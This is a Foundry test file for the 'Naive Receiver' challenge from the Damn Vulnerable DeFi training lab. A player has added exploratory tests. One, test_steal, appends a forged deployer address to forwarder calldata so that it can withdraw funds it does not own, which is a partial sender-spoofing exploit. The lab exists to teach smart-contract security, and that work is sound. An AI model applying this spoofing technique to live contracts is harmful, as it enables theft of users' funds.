// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
            address(forwarder),
            payable(weth),
            deployer
        );

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_steal() public {
        console.log("Player address:", player);
        console.log("deployer address:", deployer);
        console.log("Player before balance:", weth.balanceOf(player));
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool), // Changed to pool address
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodePacked(
                abi.encodeWithSignature(
                    "withdraw(uint256,address)",
                    weth.balanceOf(address(receiver)),
                    payable(player)
                ),
                deployer // Append deployer's address instead of player's
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );
        console.logBytes32(typedDataHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        address recoveredSigner = ECDSA.recover(typedDataHash, signature);
        console.log("Recovered signer:", recoveredSigner);
        console.log("Expected signer (player):", player);

        forwarder.execute(request, signature);
        console.log("Player address After:", weth.balanceOf(player));
    }

    function test_assertInitialState() public {
        // Check initial balances
        //NaiveReceiverPool
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        //FlashLoanReceiver
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        //NaiveReceiverPool
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(0x48f5c3ed);
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {}

    function test_works() public {
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool), // Changed to pool address
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), // The flash loan receiver
                address(weth), // The token (WETH)
                WETH_IN_RECEIVER, // The amount to borrow
                "" // Additional data (empty in this case)
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        bytes32 domainSeparator = forwarder.domainSeparator();
        bytes32 typedDataHash = keccak256(
            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
        );
        console.logBytes32(typedDataHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        address recoveredSigner = ECDSA.recover(typedDataHash, signature);
        console.log("Recovered signer:", recoveredSigner);
        console.log("Expected signer (player):", player);

        forwarder.execute(request, signature);
    }

    function test_fwder_old() public {
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool), // Changed to pool address
            value: 0,
            gas: 1000000,
            nonce: 0,
            data: abi.encodeWithSignature(
                "flashLoan(address,address,uint256,bytes)",
                address(receiver), // The flash loan receiver
                address(weth), // The token (WETH)
                WETH_IN_RECEIVER, // The amount to borrow
                "" // Additional data (empty in this case)
            ),
            deadline: block.timestamp + 1000
        });

        bytes32 requestHash = forwarder.getDataHash(request);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(
            weth.balanceOf(address(receiver)),
            0,
            "Unexpected balance in receiver contract"
        );

        // Pool is empty too
        assertEq(
            weth.balanceOf(address(pool)),
            0,
            "Unexpected balance in pool"
        );

        // All funds sent to recovery account
        assertEq(
            weth.balanceOf(recovery),
            WETH_IN_POOL + WETH_IN_RECEIVER,
            "Not enough WETH in recovery account"
        );
    }
}
